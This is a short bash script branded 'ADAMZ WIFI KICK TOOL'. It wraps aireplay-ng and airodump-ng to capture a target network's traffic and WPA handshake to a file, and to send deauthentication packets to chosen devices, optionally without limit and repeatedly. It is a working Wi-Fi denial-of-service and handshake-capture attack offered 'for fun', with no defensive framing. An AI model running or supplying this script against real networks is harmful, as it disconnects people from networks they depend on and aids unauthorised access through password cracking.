#!/bin/bash
# ADAMZ BEST EVER WIFI KICK TOOL NO UPDATE NEEDED

################################
# CREATOR: ADAMZ
# ABOUT: ADAMZ HELPS YOU TO TAKING FUN FOR YOU. JUST FOLLOW ME FOR MORE.

tput setaf 1; echo " 
                                ADAMZ  WIFI KICK 
 "                                
function kickResp
{
    tput setaf 6;   echo "Kick another device? (y/n):$(tput sgr 0)"
    read kickAns
    if [ "$kickAns" == "Y" ] || [ "$kickAns" == "y" ]
    then
        main
    else
        ifconfig wlan0 up
        tput setaf 3;   echo "Wireless card has been enabled.$(tput sgr 0)"
    fi  
}
 
function main
{
    tput setaf 6;   echo "Enter MAC address of device you wish to kick:$(tput sgr 0)"
    read deviceID
    tput setaf 6;   echo "Enter number of DeAuth Packets (0 for infinite):$(tput sgr 0)"
    read pacNum
    aireplay-ng -0 $pacNum -a $bssID -c $deviceID wlan0
    kickResp
}
 
tput setaf 3;   echo "*** ADAMZ WIFI KICK TOOL (ADAMZ NEW ONE TRY IT) ***$(tput sgr 0)"
tput setaf 5;   echo "############################"
tput setaf 6;   echo "# CREATER:$(tput sgr 0) ADAMZ"
tput setaf 6;   echo "# Date:$(tput sgr 0) 20/03/2021"
tput setaf 5;   echo "############################$(tput sgr 0)"
                echo " "
ifconfig wlan0 down
tput setaf 3;   echo "Succesfully took down wireless card.$(tput sgr 0)"
aireplay-ng -9 wlan0
tput setaf 6;   echo "Enter BSSID of network:$(tput sgr 0)"
read bssID
tput setaf 6;   echo "Enter channel number of network:$(tput sgr 0)"
read cNo
xterm -hold -e airodump-ng -c$cNo --bssid $bssID -w psk wlan0 & tput setaf 3; echo "Starting injection...$(tput sgr 0)"
main
